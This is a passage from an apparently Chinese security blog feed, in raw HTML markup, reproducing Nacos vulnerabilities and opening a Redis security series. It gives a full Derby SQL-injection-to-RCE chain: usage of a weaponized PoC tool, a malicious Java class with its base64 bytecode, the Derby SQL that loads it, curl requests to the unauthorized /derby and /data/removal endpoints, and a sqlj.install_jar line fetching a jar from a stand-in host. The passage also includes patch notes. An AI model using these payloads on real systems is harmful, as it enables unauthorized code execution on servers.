class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs typescript">package com.<span class="hljs-property">alibaba</span>.<span class="hljs-property">nacos</span>.<span class="hljs-property">console</span>.<span class="hljs-property">utils</span>;<br><br><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">security</span>.<span class="hljs-property">crypto</span>.<span class="hljs-property">bcrypt</span>.<span class="hljs-property">BCryptPasswordEncoder</span>;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Password encoder tool.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> <span class="hljs-variable">nacos</span></span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordEncoderUtil</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-title class_">String</span>[] args</span>) &#123;<br>        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().<span class="hljs-title function_">encode</span>(<span class="hljs-string">&quot;nacos&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">Boolean</span> <span class="hljs-title function_">matches</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> raw, <span class="hljs-title class_">String</span> encoded</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().<span class="hljs-title function_">matches</span>(raw, encoded);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">encode</span>(<span class="hljs-params"><span class="hljs-title class_">String</span> raw</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BCryptPasswordEncoder</span>().<span class="hljs-title function_">encode</span>(raw);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a><em>漏洞原理</em></h2><p>漏洞代码在config\src\main\java\com\alibaba\nacos\config\server\controller\ConfigOpsController.java#derbyOps</p><p><img src="https://img1.plumstar.cn/upload5image-20240911154206474.png"></p><p>跟进一下看一眼，第一个if的值取决于是否standalone模式启动的nacos，所以在standalone模式启动nacos的话，默认就可以进入第一个if</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">PropertyUtil<span class="hljs-selector-class">.isEmbeddedStorage</span>()<br>ApplicationUtils<span class="hljs-selector-class">.getStandaloneMode</span>()<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240911154534373.png"></p><p>跟进看一下embeddedStorage</p><p><img src="https://img1.plumstar.cn/upload5image-20240911155232187.png"></p><p>跟进getStandaloneMode()，找到这个方法，我IDEA不知道哪里出了问题，方法跟进不过去，只能搜一下找到定义方法的地方</p><p><img src="https://img1.plumstar.cn/upload5image-20240911155532930.png"></p><p>第二个if也仅仅是判断了参数sql的值是否以”select”为字符串开头，然后就直接可以使用derby的查询功能了。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a><em>修复方案</em></h2><p>参考1.4.1中此处的代码，添加了nacos&#x2F;admin 的注解来限制仅管理员角色使用该接口(Nacos基于Spring Security来做了访问控制)</p><p><img src="https://img1.plumstar.cn/upload5image-20240911155753457.png"></p><p>开启鉴权配置后即可做到限制未授权访问</p><p><img src="https://img1.plumstar.cn/upload5image-20240911160249166.png"></p><h1 id="Derby未授权-SQL注入-RCE"><a href="#Derby未授权-SQL注入-RCE" class="headerlink" title="Derby未授权-&gt;SQL注入-&gt;RCE"></a>Derby未授权-&gt;SQL注入-&gt;RCE</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a><em>漏洞描述</em></h2><p>在上文中我们分析了，Derby未授权SQL注入利用的是&#x2F;derby这个路由，但是限制了语句必须为select开头的即查询语句，而仅仅是查询语句就无法RCE。所以DerbyRCE的这个漏洞是利用removal接口在完成这个利用链完成derby注入的深入利用（最开始出来的打法用到的是”CALL sqlj.install_jar”简单来说就是将远程服务器上的jar包导入数据库，就可以动态调用类中的static方法），也就是所谓组合拳RCE，可以算是Nacos远程代码执行</p><p>这个漏洞没给编号，看了一下长亭的通告是7月19日的通告，挺吓人的，HW刚准备开始就出来了，影响版本Nacos &lt; 2.4.0</p><p><img src="https://img1.plumstar.cn/upload5image-20240911164529873.png"></p><p>我这里漏洞环境就用了2.3.2，只要低于2.4.0就可以了</p><h2 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a><em>漏洞检测</em></h2><p>关于漏洞的手动检测，我看懂了，但是感觉比较复杂，方法我写在这里大家可以去验证一下，我更倾向于直接脚本一把梭，虽然原版poc被删了但是还是流传出来了并且武器化了，关于原版poc的分析后续我可能会出，时间未知</p><p><a href="https://github.com/FFR66/Nacos_Rce">https://github.com/FFR66/Nacos_Rce</a></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs clean">### 启动service，也就是服务端，带着我们要打的payload<br>python3 service.py<br>### 启动主程序<br>python3 Nacos_Rce.py -t vps的ip地址 -p <span class="hljs-number">5000</span> -u http:<span class="hljs-comment">//xxx.xxx.xxx -c whoami</span><br>例如我这里是在本地<br>python3 Nacos_Rce.py -t <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> -p <span class="hljs-number">5000</span> -u http:<span class="hljs-comment">//192.168.50.1：8848 -c whoami</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20240911231405911.png"></p><p>这种思路就是我们写到本地，也就是我们的vps，然后去加载。但是这种方式，必须在机器出网的情况下，如果目标机器不出网，就歇菜了</p><p><strong>这里还想说在网上看到的另一位师傅的思路，通过create type typeClass external 的方式自定义数据类型来映射java类</strong></p><p>首先验证未授权存在</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">curl -XGET <span class="hljs-string">&quot;http://192.168.92.1:8848/nacos/v1/cs/ops/derby?sql=select<span class="hljs-variable">%20</span>*<span class="hljs-variable">%2</span>0from<span class="hljs-variable">%2</span>0users<span class="hljs-variable">%20</span>&quot;</span><br></code></pre></td></tr></table></figure><p>然后制作命令执行类</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">┌──(root㉿kali)-[/tmp]<br>└─# vim MaliciousClass.java<br><br><span class="hljs-bullet">--</span><br><span class="hljs-bullet"></span>public class MaliciousClass &#123;<br><span class="hljs-code">    static &#123;</span><br><span class="hljs-code">        try &#123;</span><br><span class="hljs-code">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="hljs-code">        &#125; catch (Exception e) &#123;</span><br><span class="hljs-code">                //TODO:handle exception</span><br><span class="hljs-code">        &#125;</span><br><span class="hljs-code">    &#125;</span><br><span class="hljs-section">&#125;</span><br><span class="hljs-section">--</span><br><br>┌──(root㉿kali)-[/tmp]<br>└─# javac MaliciousClass.java <br><br>┌──(root㉿kali)-[/tmp]<br>└─# cat MaliciousClass.class | base64<br>yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENv<br>ZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3Vy<br>Y2VGaWxlAQATTWFsaWNpb3VzQ2xhc3MuamF2YQwACAAJBwAZDAAaABsBAARjYWxjDAAcAB0BABNq<br>YXZhL2xhbmcvRXhjZXB0aW9uAQAOTWFsaWNpb3VzQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAR<br>amF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAE<br>ZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAA<br>AgABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAEACAAMAAkAAQAKAAAA<br>RwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAIACwAAABIABAAAAAQACQAHAAwABQAN<br>AAgADQAAAAcAAkwHAA4AAAEADwAAAAIAEA==<br></code></pre></td></tr></table></figure><p><strong>对应的sql语句，这些语句其实也好理解，上面我们是从vps去加载我们的payload，这个是我们自己去在目标机器通过create type typeClass external 的方式自定义数据类型来映射java类，达到恶意类的效果并且执行我们的命令</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">type</span> typeClass <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;java.lang.Class&#x27;</span> <span class="hljs-keyword">language</span> java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">type</span> typeClassLoader <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;java.lang.ClassLoader&#x27;</span> <span class="hljs-keyword">language</span> java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> base64Decode(className <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>)) <span class="hljs-keyword">RETURNS</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>) <span class="hljs-keyword">FOR</span> <span class="hljs-type">BIT</span> DATA <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;org.springframework.util.Base64Utils.decodeFromString&#x27;</span> <span class="hljs-keyword">language</span> java parameter style java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> getSystemClassLoader() <span class="hljs-keyword">returns</span> typeClassLoader <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;java.lang.ClassLoader.getSystemClassLoader&#x27;</span> <span class="hljs-keyword">language</span> java parameter style java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> defineClass(className <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>), bytes <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">32672</span>) <span class="hljs-keyword">FOR</span> <span class="hljs-type">BIT</span> DATA, loader typeClassLoader) <span class="hljs-keyword">returns</span> typeClass <span class="hljs-keyword">external</span> <span class="hljs-type">name</span> <span class="hljs-string">&#x27;org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)&#x27;</span> <span class="hljs-keyword">language</span> java parameter style java<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test(v typeClass)<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> test <span class="hljs-keyword">values</span> (defineClass(<span class="hljs-string">&#x27;MaliciousClass&#x27;</span>, base64Decode(<span class="hljs-string">&#x27;yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3VyY2VGaWxlAQATTWFsaWNpb3VzQ2xhc3MuamF2YQwACAAJBwAZDAAaABsBAARjYWxjDAAcAB0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAOTWFsaWNpb3VzQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAgABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAEACAAMAAkAAQAKAAAARwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAIACwAAABIABAAAAAQACQAHAAwABQANAAgADQAAAAcAAkwHAA4AAAEADwAAAAIAEA==&#x27;</span>), getSystemClassLoader()));<br></code></pre></td></tr></table></figure><p>攻击：去GET我们写到目标机器的这个类，获取到我们想要的</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;file=@./payload.sql&quot;</span> <span class="hljs-string">&quot;http://192.168.111.130:8848/nacos/v1/cs/ops/data/removal&quot;</span><br></code></pre></td></tr></table></figure><p>不出意外的话复现会遇到”file xxx does not exist”，这个实际上是正常的，建议写个脚本挂着打然后看运气什么时候碰撞成功了</p><p>这位师傅提供的思路我并没去复现，大家感兴趣的可以试一下</p><h2 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a><em>漏洞原理</em></h2><p>两部分，未授权部分的分析在上文已经写出了。</p><p>derby数据库rce的原理重点就是理解上面写出的打法中用到的函数，第三种在上文中已经写了，这里简单补充下一和二</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-meta">#最开始公开poc中的利用方式，这个函数直接导入制定jar包，前提是数据库服务器必须能够访问互联网，这在不出网的目标中不适用，也就是上面工具那里</span><br><span class="hljs-built_in">CALL</span> sqlj.install_jar(<span class="hljs-string">&#x27;http://example.com/malicious.jar&#x27;</span>, <span class="hljs-string">&#x27;APP.malicious_jar&#x27;</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-meta">#先通过数据库的内置工具将 JAR 包写到本地文件系统，然后再加载它</span><br><span class="hljs-built_in">CALL</span> SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE(<span class="hljs-string">&#x27;SELECT my_blob_column FROM my_table&#x27;</span>, <span class="hljs-string">&#x27;my_exported_file.jar&#x27;</span>, <span class="hljs-string">&#x27;&lt;delimiter&gt;&#x27;</span>)<br><span class="hljs-built_in">CALL</span> sqlj.install_jar(<span class="hljs-string">&#x27;file:///path/to/my_exported_file.jar&#x27;</span>, <span class="hljs-string">&#x27;APP.local_jar&#x27;</span>, <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>关于具体的代码层面，这里我就不写了，其实代码跟进可能稍微难懂，其实就是一个条件竞争并且derby数据库是支持调用Java的方法，然后又结合未授权，导致了这个RCE的产生</p><p><a href="https://baijiahao.baidu.com/s?id=1804988231747535544&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1804988231747535544&amp;wfr=spider&amp;for=pc</a></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a><em>漏洞修复</em></h2><p>官方已在2.4.0版本中引入了一个新的选项 derbyOpsEnabled，并将其默认设置为关闭，以防止相关接口被滥用。可在Nacos官网下载最新版本使用。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>再次特别鸣谢各位师傅</p><p><a href="https://xz.aliyun.com/t/13169?time__1311=GqmhLGOGkD/D78G7FmeYveAKg115bIeD">https://xz.aliyun.com/t/13169?time__1311=GqmhLGOGkD%2FD78G7FmeYveAKg115bIeD</a></p><p><a href="https://xz.aliyun.com/t/15151?time__1311=GqjxuQD=cDlx0nD2DUxYwrIDcmYwhjox">https://xz.aliyun.com/t/15151?time__1311=GqjxuQD%3DcDlx0nD2DUxYwrIDcmYwhjox</a></p><p><a href="https://gitcode.csdn.net/66ca0098aa1c2020b35986ec.html">https://gitcode.csdn.net/66ca0098aa1c2020b35986ec.html</a></p>]]></content>
    
    
    <categories>
      
      <category>安全问题整理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Nacos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>redis系列安全问题整理</title>
    <link href="/2025/09/04/redis%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/"/>
    <url>/2025/09/04/redis%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="redis相关"><a href="#redis相关" class="headerlink" title="redis相关"></a>redis相关</h1><p>redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string、list、set、zset和hash。这些数据类型都支持push&#x2F;pop、add&#x2F;remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</p><h2 id="redis常用命令"><a href="#redis常用命令" class="headerlink" title="redis常用命令"></a>redis常用命令</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> xz <span class="hljs-string">&quot;Hacker&quot;</span>                     # 设置键xz的值为字符串Hacker<br>      <span class="hljs-built_in">get</span> xz                              # 获取键xz的内容<br>      <span class="hljs-built_in">SET</span> score 857                       # 设置键score的值为857<br>      INCR score                          # 使用INCR命令将score的值增加1<br>      <span class="hljs-built_in">GET</span> score                           # 获取键score的内容<br>      keys *                              # 列出当前数据库中所有的键<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> protected-mode <span class="hljs-literal">no</span>        # 关闭安全模式<br>      <span class="hljs-built_in">get</span> anotherkey                      # 获取一个不存在的键的值<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> dir /root/redis          # 设置保存目录<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">set</span> dbfilename redis.rdb     # 设置保存文件名<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">get</span> dir                      # 查看保存目录<br>     <span class="hljs-built_in"> config </span><span class="hljs-built_in">get</span> dbfilename               # 查看保存文件名<br>      save                                # 进行一次备份操作<br>      flushall                            # 删除所有数据<br>      del key                             # 删除键为key的数据<br>      slaveof<span class="hljs-built_in"> ip port </span>                # 设置主从关系<br>      redis-cli -h<span class="hljs-built_in"> ip </span>-p 6379 -a passwd   # 外部连接<br></code></pre></td></tr></table></figure><h2 id="Redis基本操作"><a href="#Redis基本操作" class="headerlink" title="Redis基本操作"></a>Redis基本操作</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">1</span>.使用<span class="hljs-built_in">SET</span>和<span class="hljs-built_in">GET</span>命令，可以完成基本的赋值和取值操作；<br><span class="hljs-number">2</span>.Redis是不区分命令的大小写的，<span class="hljs-built_in">set</span>和<span class="hljs-built_in">SET</span>是同一个意思；<br><span class="hljs-number">3</span>.使用<span class="hljs-built_in">keys</span> *可以列出当前数据库中的所有键；<br><span class="hljs-number">4</span>.当尝试获取一个不存在的键的值时，Redis会返回空，即(<span class="hljs-literal">nil</span>)；<br><span class="hljs-number">5</span>.如果键的值中有空格，需要使用双引号括起来，如<span class="hljs-string">&quot;Hello World&quot;</span>；<br></code></pre></td></tr></table></figure><h2 id="ReRedis配置文件参数"><a href="#ReRedis配置文件参数" class="headerlink" title="ReRedis配置文件参数"></a>ReRedis配置文件参数</h2><p>port参数</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">格式为<span class="hljs-keyword">port</span>后面接端口号，如<span class="hljs-keyword">port</span> 6379，表示Redis服务器将在6379端口上进行监听来等待客户端的连接。<br></code></pre></td></tr></table></figure><p>bind参数</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">格式为bind后面接<span class="hljs-built_in">IP</span>地址，可以同时绑定在多个<span class="hljs-built_in">IP</span>地址上，<span class="hljs-built_in">IP</span>地址之间用空格分离，如bind <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>，表允许<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span>和<span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>两个<span class="hljs-built_in">IP</span>连接。如果设置为<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>则表示任意<span class="hljs-built_in">ip</span>都可连接，说白了就是白名单。<br></code></pre></td></tr></table></figure><p>save参数</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs fortran">格式为<span class="hljs-keyword">save</span> &lt;秒数&gt; &lt;变化数&gt;，表示在指定的秒数内数据库存在指定的改变数时自动进行备份（Redis是内存数据库，这里的备份就是指把内存中的数据备份到磁盘上）。可以同时指定多个<span class="hljs-keyword">save</span>参数，如：<br><span class="hljs-keyword">save</span> <span class="hljs-number">900</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">save</span> <span class="hljs-number">300</span> <span class="hljs-number">10</span><br><span class="hljs-keyword">save</span> <span class="hljs-number">60</span> <span class="hljs-number">10000</span><br>表示如果数据库的内容在<span class="hljs-number">60</span>秒后产生了<span class="hljs-number">10000</span>次改变，或者<span class="hljs-number">300</span>秒后产生了<span class="hljs-number">10</span>次改变，或者<span class="hljs-number">900</span>秒后产生了<span class="hljs-number">1</span>次改变，那么立即进行备份操作。<br></code></pre></td></tr></table></figure><p>requirepass参数</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">格式为requirepass后接指定的密码，用于指定客户端在连接Redis服务器时所使用的密码。Redis默认的密码参数是空的，说明不需要密码即可连接；同时，配置文件有一条注释了的requirepass foobared命令，如果去掉注释，表示需要使用foobared密码才能连接Redis数据库。<br></code></pre></td></tr></table></figure><p>dir参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">格式为<span class="hljs-built_in">dir</span>后接指定的路径，默认为<span class="hljs-built_in">dir</span> ./，指明Redis的工作目录为当前目录，即redis-server文件所在的目录。注意，Redis产生的备份文件将放在这个目录下。<br></code></pre></td></tr></table></figure><p>dbfilename参数</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">格式为dbfilename后接指定的文件名称，用于指定Redis备份文件的名字，默认为dbfilename <span class="hljs-keyword">dump</span>.rdb，即备份文件的名字为<span class="hljs-keyword">dump</span>.rdb。<br></code></pre></td></tr></table></figure><p>config命令</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">通过<span class="hljs-built_in">config</span>命令可以读取和设置<span class="hljs-keyword">dir参数以及dbfilename参数，因为这条命令比较危险（实验将进行详细介绍），所以Redis在配置文件中提供了rename-command参数来对其进行重命名操作，如rename-command </span><span class="hljs-built_in">CONFIG</span> HTCMD，可以将<span class="hljs-built_in">CONFIG</span>命令重命名为HTCMD。配置文件默认是没有对<span class="hljs-built_in">CONFIG</span>命令进行重命名操作的。<br></code></pre></td></tr></table></figure><p>protected-mode参数</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">redis3<span class="hljs-number">.2</span>之后添加了protected-mode安全模式，默认值为<span class="hljs-literal">yes</span>，开启后禁止外部连接，所以在测试时，先在配置中修改为<span class="hljs-literal">no</span>。<br></code></pre></td></tr></table></figure><h1 id="redis漏洞利用原理"><a href="#redis漏洞利用原理" class="headerlink" title="redis漏洞利用原理"></a>redis漏洞利用原理</h1><p>Redis 提供了2种不同的持久化方式，RDB方式和AOF方式.</p><ul><li>RDB 持久化可以在指定的时间间隔内生成数据集的时间点快照</li><li>AOF 持久化记录服务器执行的所有写操作命令.</li></ul><p>经过查看官网文档发现AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过appendfilename设置其他名称，通过测试发现不能在客户端交互中动态设置appendfilename，所以不能通过AOF方式备份写任意文件.</p><ul><li>RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改，造成可以写任意文件.</li></ul><h1 id="redis-未授权访问漏洞"><a href="#redis-未授权访问漏洞" class="headerlink" title="redis 未授权访问漏洞"></a>redis 未授权访问漏洞</h1><p>其实最关键的便是未授权可以访问redis导致一系列漏洞单独整理一篇redis相关的未授权访问漏洞的利用，还是有比较多的利用方式</p><p>漏洞编号：<strong>cnvd_2015_07557</strong></p><h2 id="漏洞简介以及危害"><a href="#漏洞简介以及危害" class="headerlink" title="漏洞简介以及危害"></a>漏洞简介以及危害</h2><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接用在线靶场也是可以的</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">2</span>.<span class="hljs-number">8</span>.<span class="hljs-number">17</span>.tar.gz<br><span class="hljs-attribute">tar</span> xzvf redis-<span class="hljs-number">2</span>.<span class="hljs-number">8</span>.<span class="hljs-number">17</span>.tar.gz  #解压安装包<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">2</span>.<span class="hljs-number">8</span>.<span class="hljs-number">17</span>  # 进入redis目录<br><span class="hljs-attribute">make</span> #编译<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241007214855918.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> src/ <span class="hljs-comment">#进入src目录 </span><br><span class="hljs-built_in">cp</span> redis-server /usr/bin/ <br><span class="hljs-built_in">cp</span> redis-cli /usr/bin/      <span class="hljs-comment">#将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="hljs-built_in">cd</span> ..   <span class="hljs-comment"># 返回上一级目录</span><br><span class="hljs-built_in">cp</span> redis.conf /etc/     